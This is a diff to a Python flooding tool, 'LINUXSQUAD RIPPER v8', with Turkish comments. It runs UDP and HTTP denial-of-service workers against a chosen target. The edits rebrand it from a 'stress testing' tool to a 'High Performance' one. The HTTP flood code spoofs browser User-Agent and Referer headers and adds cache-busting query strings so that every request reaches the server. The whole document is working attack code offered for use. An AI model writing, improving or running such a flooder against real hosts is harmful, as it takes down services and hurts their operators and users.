@@ -19,8 +19,8 @@ import aiohttp
 os.system("clear")
 print("\033[92m")
 print("╔══════════════════════════════════════════════════════════════════════════════╗")
-print("║                    LINUXSQUAD RIPPER v8 - TERMUX FIXED                      ║")
-print("║                  UDP + HTTP Stress Testing Tool                             ║")
+print("║                    LINUXSQUAD RIPPER v8 - TERMUX FIXED v2                   ║")
+print("║                  High Performance UDP + HTTP Tool                            ║")
 print("╚══════════════════════════════════════════════════════════════════════════════╝")
 print("\033[0m")
 
@@ -79,9 +79,7 @@ def udp_flood_worker():
             update_stats(err=1)
 
 # ===================== HTTP FLOOD =====================
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
-]
+USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"]
 REFERERS = ["https://www.google.com/"]
 PATHS = ["/", "/index", "/home", "/search"]
 
@@ -91,10 +89,9 @@ async def http_flood_worker(session):
             headers = {
                 "User-Agent": random.choice(USER_AGENTS),
                 "Referer": random.choice(REFERERS),
-                "Accept": "*/*",
                 "Cache-Control": "no-cache"
             }
-            cache_buster = f"?t={int(time.time() * 1000000)}"
+            cache_buster = f"?t={int(time.time()*1000000)}"
             path = random.choice(PATHS) + cache_buster
             url = f"http://{target}:{port}{path}" if port not in (80, 443) else f"http://{target}{path}"
 
@@ -112,14 +109,14 @@ if UVLOOP_ENABLED:
 
 threading.Thread(target=print_stats, daemon=True).start()
 
-# UDP
+# UDP Başlat
 if method in ["udp", "mixed"]:
     udp_count = int(concurrency * 0.7) if method == "mixed" else concurrency
     print(f"\033[92m[+] {udp_count} UDP Worker başlatılıyor...\033[0m")
     for _ in range(udp_count):
         threading.Thread(target=udp_flood_worker, daemon=True).start()
 
-# HTTP
+# HTTP Başlat
 if method in ["http", "mixed"]:
     http_count = int(concurrency * 0.3) if method == "mixed" else max(50, concurrency//2)
     print(f"\033[92m[+] {http_count} HTTP Worker başlatılıyor...\033[0m")
@@ -133,11 +130,11 @@ if method in ["http", "mixed"]:
 
     asyncio.run(run_http_flood())
 
-# Süre kontrolü
+# Süre kontrolü (DÜZELTİLDİ)
 try:
     if duration > 0:
         print(f"\033[93m[+] {duration} saniye sonra duracak...\033[0m")
-        time.sleep(duration)
+        time.sleep(duration)          # await yerine time.sleep kullanıldı
     else:
         while True:
             time.sleep(10)
